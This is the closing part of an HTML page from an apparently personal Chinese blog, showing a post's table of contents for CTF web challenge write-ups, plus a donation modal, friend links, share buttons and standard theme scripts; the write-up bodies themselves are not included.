                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#GYCTF2020-Blacklist"><span class="post-toc-number">1.</span> <span class="post-toc-text">[GYCTF2020]Blacklist</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#MRCTF2020-你传你🐎呢"><span class="post-toc-number">2.</span> <span class="post-toc-text">[MRCTF2020]你传你🐎呢</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#GXYCTF2019-禁止套娃"><span class="post-toc-number">3.</span> <span class="post-toc-text">[GXYCTF2019]禁止套娃</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#方法一-利用常量函数"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">方法一:利用常量函数</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#方法二-利用session"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">方法二:利用session</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#MRCTF2020-Ez-bypass"><span class="post-toc-number">4.</span> <span class="post-toc-text">[MRCTF2020]Ez_bypass</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#De1CTF-2019-SSRF-Me"><span class="post-toc-number">5.</span> <span class="post-toc-text">[De1CTF 2019]SSRF Me</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#方法一-哈希拓展攻击"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">方法一:哈希拓展攻击</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#方法二-字符串拼接"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">方法二:字符串拼接</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#方法三-local-file"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">方法三:local_file</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#安洵杯-2019-easy-web"><span class="post-toc-number">6.</span> <span class="post-toc-text">[安洵杯 2019]easy_web</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#GXYCTF2019-BabyUpload"><span class="post-toc-number">7.</span> <span class="post-toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#BJDCTF2020-Mark-loves-cat"><span class="post-toc-number">8.</span> <span class="post-toc-text">[BJDCTF2020]Mark loves cat</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#方法一-GET"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">方法一:GET</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#方法二-GET-POST"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">方法二:GET+POST</span></a></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        让这个世界的bug有趣一点
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

    

</div>

    </main>
    <footer class="footer ">
    
    <div class="top">
        
            <p>
    <span>Links：</span>
    
    <span class="blogroll-item">
        <a href="http://www.pdsdt.lovepdsdt.com/" target="_blank">Pdsdt</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.starssgo.top/" target="_blank">starssgo</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://phoebe233.cn/" target="_blank">W4nder</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.dongzt.cn/" target="_blank">Alkaid</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://whali3n51.top/" target="_blank">Whali3n51</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.ap1e.cn/" target="_blank">Aple</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://geeeez.github.io/" target="_blank">Geez</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://kkzevip.com/" target="_blank">MoR03r</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.virzz.com/" target="_blank">Virink</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.luoluopeach.top/" target="_blank">Luoluo</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://39.97.247.119/" target="_blank">Vigorous</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.constantine24.com/" target="_blank">Shanks</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.ysllz.com/" target="_blank">ysllz</a>
    </span>
    
</p>

        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                Damya &copy; 2018 - 2021
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.damyahome.github.io/ctf-writeup-web/ckwd5kugt001y5cuc4fogu9df/&title=《BUUCTF web练习5》 — Damya's Blog&pic=http://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.damyahome.github.io/ctf-writeup-web/ckwd5kugt001y5cuc4fogu9df/&title=《BUUCTF web练习5》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACrElEQVR42u3aQW4bMRAEQP//0845h5W6Z0hFCGpPgr0SWTyQgx7+/MTP78Pz9M7rv7TvP4147MHDw8M7NPV8mNeA5HM+ev4tPDw8vNu8px316Z3X38o39NeM5IB5Mys8PDy8r+G9ZiekvETGw8PD+z94bbm8jzzw8PDwvo2X/3QewibRQ1tYX8xa8PDw8GJevmV/z+cr/T08PDy8dVc92XCTeDf/nSTGLWaLh4eHd4GXb7htkNoGCpso+U1AjIeHh3eN18YNSWQwOx5mc3hcCDw8PLwLvGRybVSxKc3bELkIcPHw8PDWvH3LatOsyg+PpFVWF9N4eHh4a97+6sCsOJ5dzzrWAMPDw8NbI2cTypejvZRw4OoVHh4e3gd57TGQv9O2zdpApBgYDw8Pb53Qngpe26m0VwTy8AIPDw/vHi8pgmeBwqYlduoyFh4eHt493r6V1V4CyBe0bYzh4eHh3eAlPzcLFPISPI9Chq0vPDw8vGu8fcnbLtae+qagx8PDw7vGy2H7BtiGlBwPf72Jh4eHd43X5hb5MHm8m0cPwzACDw8P7xqv3aBnwe7mskJy8AxvN+Dh4eHFWWi7+W6aWKf6+3h4eHjfw0sm2g7ZFtOn2nh4eHh493h5uTxr6p+9rpocY3h4eHi3eQmpbYy1xfHmAtabJcbDw8O7zJsFrMkBM5tuu/R4eHh4n+dtppVMYrYEbTDxpqTGw8PDW/B+y2e4fuVenYS/UYSBh4eHd4E323DbSCIZOG+SDS8Q4OHh4R3lJYdB/rldv9mVr+JqFx4eHt413qnCNw92TwUQ0cGAh4eH9095eW0+i3rbYv3wwYCHh4f3QV7+O6+PmeS/xeGEh4eHd42XD5M3nNpLqJs440DWgoeHh3fmu1EJ20YSyaWrA5PGw8PDO8/7A+zc2O7kv0skAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>

<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>

<!-- third-party -->






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>




    <script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '等你回来呀~';
                clearTimeout(titleTime);
            } else {
                document.title = '(つェ⊂)欢迎回来!';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>





    
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
